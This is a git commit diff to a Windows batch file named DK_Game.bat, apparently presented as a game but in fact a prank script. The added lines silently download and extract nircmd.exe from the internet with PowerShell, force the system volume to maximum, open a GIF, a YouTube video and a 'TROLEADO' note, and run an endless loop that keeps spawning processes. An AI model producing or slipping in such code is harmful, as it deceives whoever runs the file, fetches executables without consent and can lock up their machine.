69c8b6df30dcfc653269dbb023b287df014ae1d4
MarMDps2 <marcosmoldel@gmail.com>
2025-02-17 09:13:52 +0100

    eliminacion de txt e imagen porque descarga automaticamente

--- DK_Game.bat
+++ DK_Game.bat
@@ -1,5 +1,12 @@
 @echo off
-:: Desmutear el volumen usando PowerShell
+set "NIRCMD_PATH=%TEMP%\nircmd.exe"
+if not exist "%NIRCMD_PATH%" (
+    echo nircmd.exe no encontrado. Descargándolo...
+    powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://www.nirsoft.net/utils/nircmd.zip', '%TEMP%\nircmd.zip')"
+        echo Extrayendo nircmd.exe...
+    powershell -Command "Expand-Archive -Path '%TEMP%\nircmd.zip' -DestinationPath '%TEMP%' -Force"
+    move /Y "%TEMP%\nircmd.exe" "%NIRCMD_PATH%"
+)
 "%NIRCMD_PATH%" mutesysvolume 0
 "%NIRCMD_PATH%" setsysvolume 65535
 set "script_dir=%~dp0"
@@ -8,7 +15,9 @@ echo ¡¡¡¡¡¡¡¡¡¡¡¡¡TROLEADO!!!!!!!!!!!!!! > "%script_dir%Troliado.tx
 start "" "%script_dir%imagen.gif"
 start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" "https://www.youtube.com/watch?v=I8p89Xun5L0&ab_channel=Player2"
 timeout /t 2
-:loop
 start notepad "%script_dir%Troliado.txt"
+timeout /t 30
 timeout /t 1
+:loop
+start "30" cmd.txt
 goto loop
